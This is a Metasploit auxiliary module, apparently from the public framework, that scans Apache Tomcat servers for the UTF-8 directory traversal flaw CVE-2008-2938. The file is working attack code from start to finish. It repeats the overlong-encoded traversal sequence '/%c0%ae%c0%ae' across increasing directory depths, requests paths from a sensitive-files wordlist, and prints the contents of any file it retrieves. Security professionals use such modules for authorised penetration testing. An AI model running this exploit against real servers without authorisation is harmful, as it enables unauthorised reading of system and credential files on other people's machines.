##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::WmapScanServer
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name' => 'Tomcat UTF-8 Directory Traversal Vulnerability',
      'Description' => %q{
        This module tests whether a directory traversal vulnerability is present
        in versions of Apache Tomcat 4.1.0 - 4.1.37, 5.5.0 - 5.5.26 and 6.0.0
        - 6.0.16 under specific and non-default installations. The connector must have
        allowLinking set to true and URIEncoding set to UTF-8. Furthermore, the
        vulnerability actually occurs within Java and not Tomcat; the server must
        use Java versions prior to Sun 1.4.2_19, 1.5.0_17, 6u11 - or prior IBM Java
        5.0 SR9, 1.4.2 SR13, SE 6 SR4 releases. This module has only been tested against
        RedHat 9 running Tomcat 6.0.16 and Sun JRE 1.5.0-05. You may wish to change
        FILE (hosts,sensitive files), MAXDIRS and RPORT depending on your environment.
        },
      'References' => [
        [ 'URL', 'http://tomcat.apache.org/' ],
        [ 'OSVDB', '47464' ],
        [ 'CVE', '2008-2938' ],
        [ 'URL', 'http://www.securityfocus.com/archive/1/499926' ],
      ],
      'Author' => [ 'aushack', 'guerrino <ruggine> di massa' ],
      'License' => MSF_LICENSE,
      'DisclosureDate' => 'Jan 9 2009',
      'Notes' => {
        'Stability' => [CRASH_SAFE],
        'SideEffects' => [IOC_IN_LOGS],
        'Reliability' => []
      }
    )

    register_options(
      [
        Opt::RPORT(8080),
        OptString.new('TARGETURI', [true, 'URI to the Tomcat instance', '/']),
        OptPath.new('SENSITIVE_FILES', [
          true, 'File containing sensitive files, one per line',
          File.join(Msf::Config.data_directory, 'wordlists', 'sensitive_files.txt')
        ]),
        OptInt.new('MAXDIRS', [ true, 'The maximum directory depth to search', 7]),
      ]
    )
  end

  def extract_words(wordfile)
    return [] unless wordfile && File.readable?(wordfile)

    File.readlines(wordfile, chomp: true)
  rescue ::StandardError => e
    elog(e)
    []
  end

  def find_files(files)
    traversal = '/%c0%ae%c0%ae'

    1.upto(datastore['MAXDIRS']) do |level|
      try = traversal * level
      res = send_request_raw(
        {
          'method' => 'GET',
          'uri' => normalize_uri(datastore['TARGETURI'], try, files)
        }, 25
      )
      if res && (res.code == 200)
        print_status("Request ##{level} may have succeeded on #{rhost}:#{rport}:file->#{files}! Response: \r\n#{res.body}")
        @files_found << files
        break
      elsif res && res.code
        vprint_error("Attempt ##{level} returned HTTP error #{res.code} on #{rhost}:#{rport}:file->#{files}")
      end
    end
  end

  def run_host(_ip)
    @files_found = []

    print_status("Attempting to connect to #{rhost}:#{rport}")
    res = send_request_raw(
      {
        'method' => 'GET',
        'uri' => normalize_uri(datastore['TARGETURI'])
      }, 25
    )

    if res
      extract_words(datastore['SENSITIVE_FILES']).each do |files|
        find_files(files) unless files.empty?
      end
    end

    if @files_found.empty?
      print_error('No File(s) found')
      return
    end

    print_good('File(s) found:')

    @files_found.each do |f|
      print_good(f)
    end
  rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout => e
    vprint_error(e.message)
  rescue ::Timeout::Error, ::Errno::EPIPE => e
    vprint_error(e.message)
  end
end
